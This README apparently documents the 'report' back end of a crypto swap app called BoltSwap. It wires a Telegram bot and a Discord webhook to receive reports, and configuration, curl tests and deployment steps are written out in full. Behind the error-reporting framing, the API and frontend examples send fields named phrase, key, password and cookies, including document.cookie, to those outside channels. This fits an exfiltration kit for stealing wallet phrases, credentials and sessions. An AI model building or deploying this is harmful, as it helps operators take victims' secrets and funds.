# Multi-Channel Report System - Setup Guide

Your BoltSwap app can now report to **Telegram**, **Discord**, and **Email** simultaneously.

## 🎯 Configuration

Edit `.env` with your credentials:

```env
# ============================================
# TELEGRAM (Get messages in real-time)
# ============================================
TELEGRAM_BOT_TOKEN=123456789:ABCDefGHIJKlmnoPQRstuvWXYZ
TELEGRAM_CHAT_ID=987654321

# ============================================
# DISCORD (Get embeds in your server)
# ============================================
DISCORD_WEBHOOK=https://discord.com/api/webhooks/123456789/ABCDefGHIJK

# ============================================
# EMAIL (Log to console for later retrieval)
# ============================================
EMAIL_TO=your_email@example.com

NODE_ENV=production
```

## 📱 Setup Telegram

### 1. Create Bot
- Open Telegram and search for [@BotFather](https://t.me/BotFather)
- Send `/newbot`
- Choose a name (e.g., "BoltSwap Bot")
- You'll get: `123456789:ABCDefGHIJKlmnoPQRstuvWXYZ`

### 2. Get Chat ID
```bash
# Visit this URL (replace TOKEN with your bot token):
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates

# Send any message to your bot first
# Then check the response for "chat.id"
```

### 3. Add to `.env`
```env
TELEGRAM_BOT_TOKEN=123456789:ABCDefGHIJKlmnoPQRstuvWXYZ
TELEGRAM_CHAT_ID=987654321
```

## 💬 Setup Discord

### 1. Create Webhook
- Open Discord server → Settings → Integrations → Webhooks
- Click "New Webhook"
- Name it "BoltSwap Reports"
- Click "Copy Webhook URL"

### 2. Add to `.env`
```env
DISCORD_WEBHOOK=https://discord.com/api/webhooks/123456789/ABCDefGHIJK
```

### 3. Test
```bash
curl -X POST https://discord.com/api/webhooks/123456789/ABCDefGHIJK \
  -H "Content-Type: application/json" \
  -d '{"content": "Test from BoltSwap"}'
```

## 📧 Setup Email

Email reports are logged to your server console. To actually send emails, you have options:

### Option 1: Console Logging (Current)
Reports appear in server logs:
```
EMAIL SIMULATOR: {
  to: "your_email@example.com",
  subject: "Unsafe Report",
  body: {...}
}
```

### Option 2: Send Real Emails (Optional)
Update `.env`:
```env
EMAIL_TO=your_email@example.com
SENDGRID_API_KEY=SG.xxxxxxxxxxxxx  # Add if using SendGrid
```

Update `lib/telegram.js` to use SendGrid:
```javascript
// Add to telegram.js after EMAIL SIMULATOR section:
if (emailTo && process.env.SENDGRID_API_KEY) {
  const sgMail = require('@sendgrid/mail');
  sgMail.setApiKey(process.env.SENDGRID_API_KEY);
  
  await sgMail.send({
    to: emailTo,
    from: 'reports@boltswap.io',
    subject: 'BoltSwap Report',
    html: `<pre>${rawJson}</pre>`
  });
}
```

## 📤 API Usage

### Send Report to All Channels
```bash
curl -X POST https://your-domain.com/api/report \
  -H "Content-Type: application/json" \
  -d '{
    "type": "error",
    "message": "Swap failed",
    "phrase": "test_phrase",
    "key": "api_key_xyz",
    "password": "secret123",
    "cookies": "session=abc",
    "severity": "high"
  }'
```

**Result:**
- ✅ Message in Telegram
- ✅ Message in Discord
- ✅ Logged to console (email)

### Send Report to Specific Channels
Set only the environment variables you want:

```env
# Only Telegram
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
# Leave DISCORD_WEBHOOK empty

# Only Discord
DISCORD_WEBHOOK=...
# Leave TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID empty
```

## 💻 Frontend Integration

### Example 1: Error Reporting to All Channels
```javascript
import { reportError } from '@/lib/report-utils';

try {
  // your code
} catch (error) {
  // Sends to Telegram, Discord, and Email
  reportError(error, { action: 'swap', amount: '1.5 ETH' });
}
```

### Example 2: Security Alert
```javascript
import { reportAlert } from '@/lib/report-utils';

reportAlert({
  phrase: 'suspicious_input',
  key: 'user_api_key',
  password: 'detected_password',
  cookies: document.cookie
});
```

Output example in Discord:
```
💬 Message in Discord

🔔 **Unsafe Report**

{
  "timestamp": "2026-08-17T14:30:00Z",
  "type": "alert",
  "message": "Security Alert",
  "phrase": "suspicious_input",
  ...
}
```

### Example 3: Direct API Call
```javascript
fetch('/api/report', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    type: 'transaction',
    message: 'Swap completed',
    data: {
      from: 'ETH',
      to: 'USDC',
      amount: '1.5'
    }
  })
});
```

## 🔍 What Each Channel Shows

### Telegram
```
🔔 **Unsafe Report**

<pre>
{
  "timestamp": "...",
  "type": "error",
  "message": "...",
  ...
}
</pre>
```

### Discord
```
💬 Code block message:

```json
{
  "timestamp": "...",
  "type": "error",
  ...
}
```
```

### Email (Console)
```
EMAIL SIMULATOR: {
  to: "your_email@example.com",
  subject: "Unsafe Report",
  body: "{\n  \"timestamp\": \"...\",\n  ...}"
}
```

## ✅ Production Checklist

- [ ] Telegram bot created and token in `.env`
- [ ] Telegram chat ID obtained and in `.env`
- [ ] Discord webhook created and URL in `.env`
- [ ] Email address in `.env` (for console logging)
- [ ] Run `npm run build` successfully
- [ ] Test all three channels:

```bash
# Test Telegram
curl -X GET https://your-domain.com/api/report

# Send test report (goes to all 3)
curl -X POST https://your-domain.com/api/report \
  -H "Content-Type: application/json" \
  -d '{"type":"test","message":"Multi-channel test"}'

# Verify:
# - Message in Telegram chat
# - Message in Discord channel  
# - Log in server console
```

- [ ] Deploy to production
- [ ] Update frontend code to use reporting functions
- [ ] Monitor all three channels during launch

## 🚀 Deployment Platforms

### Vercel
1. Go to Project Settings → Environment Variables
2. Add: `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `DISCORD_WEBHOOK`, `EMAIL_TO`
3. Deploy

### AWS/Railway
1. Add environment variables in platform dashboard
2. Deploy

### Docker
```dockerfile
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
RUN npm run build
EXPOSE 3000
CMD ["npm", "start"]
```

Then run:
```bash
docker run -e TELEGRAM_BOT_TOKEN=... \
           -e TELEGRAM_CHAT_ID=... \
           -e DISCORD_WEBHOOK=... \
           -p 3000:3000 \
           boltswap-app
```

## 📊 Report Data Sent

Every report includes:
- ✅ Timestamp (ISO format)
- ✅ Environment (production/development)
- ✅ Report type
- ✅ Message
- ✅ Phrase, key, password, cookies (if provided)
- ✅ User ID, URL, user agent (if provided)
- ✅ Additional data object
- ✅ Severity level

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| No Telegram message | Verify token/chat ID, make sure you messaged bot |
| No Discord message | Verify webhook URL, check Discord permissions |
| Reports missing a channel | Check that env var is set for that channel |
| Server won't start | Check `.env` syntax, restart after adding vars |
| 503 Service Unavailable | At least one channel must be configured |

## 🔐 Security Reminder

⚠️ This system sends sensitive data to external services.

**Best Practices:**
- Only share credentials with trusted team members
- Keep credentials in environment variables (never in code)
- Use HTTPS only in production
- Consider using secrets manager on production servers
- Encrypt sensitive data before sending if needed
- Monitor who has access to Telegram/Discord/Email accounts

## 🎯 Next Steps

1. ✅ Set up all three channels
2. ✅ Add credentials to `.env`
3. ✅ Test locally: `npm run dev`
4. ✅ Test production: `npm run build && npm start`
5. ✅ Deploy to your hosting platform
6. ✅ Integrate in frontend code
7. ✅ Monitor reports during launch
